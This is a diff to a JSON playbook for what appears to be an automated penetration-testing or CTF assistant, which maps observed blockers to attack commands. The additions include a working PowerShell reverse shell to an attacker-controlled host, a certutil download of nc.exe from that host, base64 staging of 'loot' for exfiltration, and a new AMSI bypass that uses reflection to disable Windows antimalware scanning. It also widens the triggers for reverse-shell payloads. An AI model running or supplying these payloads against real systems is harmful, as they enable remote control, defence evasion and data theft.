@@ -40,7 +40,7 @@
     },
     {
       "id": "egress-blocked-shell",
-      "title": "Reverse Shell Never Connects — Egress Is Filtered",
+      "title": "Reverse Shell Never Connects - Egress Is Filtered",
       "tool": "nc",
       "tools": [
         "nc",
@@ -60,7 +60,7 @@
       "priority": 64,
       "hypothesis": "Your payload ran but nothing hit your listener, or a test connection is refused/timed out: the target cannot reach you OUTBOUND on that port. The box is not unexploitable - pick a port egress allows (443/53 almost always leave), or flip the direction with a BIND shell and connect IN to the target instead.",
       "proves": "nothing attack-wise; it gets a shell channel through a filtered egress",
-      "does_not_prove": "that all egress is blocked — usually only some ports are; 443/53 commonly pass",
+      "does_not_prove": "that all egress is blocked - usually only some ports are; 443/53 commonly pass",
       "report": {
         "finding": "Egress filtering on reverse-shell port",
         "severity": "info"
@@ -87,6 +87,51 @@
       ]
     },
     {
+      "id": "certutil-usage-doctor",
+      "title": "Certutil Rejected Your Arguments",
+      "tool": "certutil",
+      "tools": [
+        "certutil"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [
+        "blocker.certutil_usage"
+      ],
+      "produces": [
+        "advice.certutil"
+      ],
+      "priority": 63,
+      "hypothesis": "Certutil printed a usage or argument error, so the command never ran. Its syntax is strict and order sensitive: for a download use -urlcache -split -f with the URL first and the output path last; for a text-safe transfer, -encode the file on the source and -decode it on the target. Most 'too many arguments' errors are a missing -f or a flipped URL and path order.",
+      "proves": "nothing attack-wise; it gets the file transfer or encode command to actually run",
+      "does_not_prove": "that certutil is the only option; iwr, bitsadmin, and an SMB copy also move files",
+      "report": {
+        "finding": "Certutil invocation error (benign syntax)",
+        "severity": "info"
+      },
+      "refs": [
+        "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
+      ],
+      "commands": [
+        {
+          "tool": "certutil",
+          "run": "certutil -urlcache -split -f http://{{lhost}}/nc.exe C:\\Windows\\Temp\\nc.exe",
+          "note": "Download a file. The -f forces a fresh fetch, -split writes the body, the URL comes first and the output path LAST. A flipped order or a missing -f is the usual 'too many arguments' cause."
+        },
+        {
+          "tool": "certutil",
+          "run": "certutil -encode loot.zip loot.b64   # on the SOURCE, then move the text",
+          "note": "Base64-encode a file for transfer when a raw download is blocked or binary-unsafe. Exactly two positional args: input then output."
+        },
+        {
+          "tool": "certutil",
+          "run": "certutil -decode loot.b64 loot.zip   # on the TARGET",
+          "note": "Decode the base64 back to the original bytes. Two positional args, input then output, no extra flags."
+        }
+      ]
+    },
+    {
       "id": "shell-revshell-linux",
       "title": "Linux Reverse-Shell Payload",
       "hypothesis": "A confirmed command-execution primitive on a Linux target becomes an interactive shell by firing a bash or python callback back to your listener.",
@@ -98,7 +143,12 @@
       ],
       "requires_any": [
         "listener.open",
-        "web.cmdi_confirmed"
+        "web.cmdi_confirmed",
+        "exploit.candidate",
+        "web.sqli_confirmed",
+        "web.ssti_confirmed",
+        "web.lfi_confirmed",
+        "foothold.webshell"
       ],
       "produces": [
         "access.shell"
@@ -130,6 +180,9 @@
         "powershell",
         "nc.exe"
       ],
+      "os": [
+        "windows"
+      ],
       "requires_any": [
         "listener.open",
         "web.cmdi_confirmed",
@@ -148,7 +201,7 @@
       "commands": [
         {
           "tool": "powershell",
-          "run": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{{lhost}}',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.ASCIIEncoding]::UTF8.GetBytes($r)),0,$r.Length)}\""
+          "run": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{{lhost}}',{{lport}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.ASCIIEncoding]::UTF8.GetBytes($r)),0,$r.Length)}\""
         }
       ]
     },
@@ -162,14 +215,27 @@
         "script",
         "stty"
       ],
+      "os": [
+        "linux"
+      ],
       "requires_any": [
         "access.shell"
       ],
-      "produces": [],
+      "produces": [
+        "advice.tty"
+      ],
+      "obsoleted_by": [
+        "access.admin",
+        "objective.local_flag"
+      ],
       "priority": 58,
       "autonomy": "manual",
       "proves": "a fully-interactive TTY on the target",
       "does_not_prove": "any new access, it only stabilises the shell you already hold",
+      "report": {
+        "finding": "TTY Upgrade Guidance",
+        "severity": "info"
+      },
       "refs": [
         "https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/"
       ],
@@ -182,7 +248,7 @@
     },
     {
       "id": "fix-no-tty",
-      "title": "No TTY — Upgrade to a Real Shell",
+      "title": "No TTY - Upgrade to a Real Shell",
       "tool": "python3",
       "tools": [
         "python3",
@@ -202,7 +268,7 @@
       "sequence": true,
       "hypothesis": "'sudo: no tty present' / 'must be run from a terminal' means your shell is a dumb pipe (a web/reverse shell) with no controlling terminal - sudo, su, ssh and many interactive tools refuse to run. Spawn a PTY and they work. This is the first thing to do on nearly every raw reverse shell.",
       "proves": "nothing attack-wise; it turns a dumb shell into an interactive PTY so terminal-only commands run",
-      "does_not_prove": "a better privilege — same user, now with a usable terminal",
+      "does_not_prove": "a better privilege - same user, now with a usable terminal",
       "report": {
         "finding": "Dumb shell upgraded to a PTY",
         "severity": "info"
@@ -225,7 +291,7 @@
     },
     {
       "id": "fix-tool-wont-run",
-      "title": "Your Uploaded Tool Won't Run — Fix It",
+      "title": "Your Uploaded Tool Won't Run - Fix It",
       "tool": "sh",
       "tools": [
         "sh",
@@ -257,7 +323,7 @@
         {
           "tool": "sh",
           "run": "chmod +x {{binary}}; mv {{binary}} /dev/shm/ && /dev/shm/{{binary}}",
-          "note": "NOEXEC /tmp: if a binary gives \"Permission denied\" even after chmod +x, /tmp is mounted noexec — run it from /dev/shm or your home. Last resort: invoke the loader directly: /lib64/ld-linux-x86-64.so.2 ./{{binary}}."
+          "note": "NOEXEC /tmp: if a binary gives \"Permission denied\" even after chmod +x, /tmp is mounted noexec - run it from /dev/shm or your home. Last resort: invoke the loader directly: /lib64/ld-linux-x86-64.so.2 ./{{binary}}."
         }
       ]
     },
@@ -271,8 +337,10 @@
       "os": [
         "windows"
       ],
-      "requires_all": [
-        "blocker.amsi"
+      "requires_all": [],
+      "requires_any": [
+        "blocker.amsi",
+        "defense.control"
       ],
       "produces": [
         "advice.amsi"
@@ -296,8 +364,8 @@
         },
         {
           "tool": "powershell",
-          "run": "Invoke-Obfuscation / change the payload",
-          "note": "If the patch is itself caught: obfuscate (variable renames, base64+IEX), use a fresh/rewritten tool, or drop to a LOLBAS technique (certutil, regsvr32) that is not signatured."
+          "run": "$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like '*iUtils'){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like '*Context'){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)",
+          "note": "If the amsiInitFailed patch is itself signatured: corrupt amsiContext via reflection and Marshal::Copy in the current session, then load your script."
         }
       ]
     },
@@ -308,6 +376,10 @@
       "tool": "ssh",
       "tools": [
         "ssh"
+      ],
+      "os": [
+        "linux",
+        "windows"
       ],
       "requires_all": [
         "ssh.reachable"
@@ -330,7 +402,7 @@
       "commands": [
         {
           "tool": "ssh",
-          "run": "chmod 600 id_rsa && ssh -i id_rsa -o StrictHostKeyChecking=no {{user}}@{{target}}",
+          "run": "chmod 600 {{keyfile|id_rsa}} && ssh -i {{keyfile|id_rsa}} -o StrictHostKeyChecking=no {{user}}@{{target}}",
           "note": "save the recovered key to id_rsa first; try likely usernames (key comment, enumerated users, root). An encrypted key (ENCRYPTED header) → ssh2john id_rsa > k.hash && hashcat/john it, then unlock."
         }
       ],
@@ -340,7 +412,7 @@
     },
     {
       "id": "ssh-key-troubleshoot",
-      "title": "SSH Key Rejected — Fix It",
+      "title": "SSH Key Rejected - Fix It",
       "hypothesis": "A found or planted SSH key that SSH refuses is a puzzle lab authors use to stall you, not a dead end - the key is fine, something around it is wrong. Match the exact error to its fix: local key permissions, a passphrase, the modern ssh-rsa block, a mangled format, or - the sneaky one - the TARGET's own ~/.ssh permissions, which you can only correct from a foothold you already hold. Work the list and the key logs you in.",
       "tool": "ssh",
       "tools": [
@@ -359,7 +431,7 @@
       ],
       "priority": 80,
       "sequence": true,
-      "proves": "a working SSH key login once the surrounding blocker is fixed — a foothold",
+      "proves": "a working SSH key login once the surrounding blocker is fixed - a foothold",
       "does_not_prove": "that the key is valid at all; if every fix fails, the key may be for a different user or host",
       "report": {
         "finding": "SSH key blocker resolved",
@@ -378,7 +450,7 @@
         {
           "tool": "ssh",
           "run": "ssh -i {{keyfile}} -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa {{user}}@{{target}}",
-          "note": "\"Permission denied (publickey)\" with \"no mutual signature algorithm\": OpenSSH 8.8+ disabled ssh-rsa by default, so a valid RSA key is refused. Re-enable it with these two options — the single most common silent failure on older lab keys."
+          "note": "\"Permission denied (publickey)\" with \"no mutual signature algorithm\": OpenSSH 8.8+ disabled ssh-rsa by default, so a valid RSA key is refused. Re-enable it with these two options - the single most common silent failure on older lab keys."
         },
         {
           "tool": "ssh2john",
@@ -398,7 +470,7 @@
         {
           "tool": "ssh",
           "run": "ssh -i {{keyfile}} {{user}}@{{target}} id",
-          "note": "Retry after the matching fix. `uid=...` means the key now works — you have your foothold."
+          "note": "Retry after the matching fix. `uid=...` means the key now works - you have your foothold."
         }
       ]
     },
@@ -420,8 +492,9 @@
       ],
       "requires_any": [
         "credential.available",
-        "credential.certificate",
-        "foothold.linux"
+        "credential.password",
+        "credential.plaintext",
+        "credential.certificate"
       ],
       "produces": [
         "foothold.linux",
@@ -460,5 +533,6 @@
         "foothold.linux"
       ]
     }
-  ]
+  ],
+  "id": "shells_2026_09"
 }
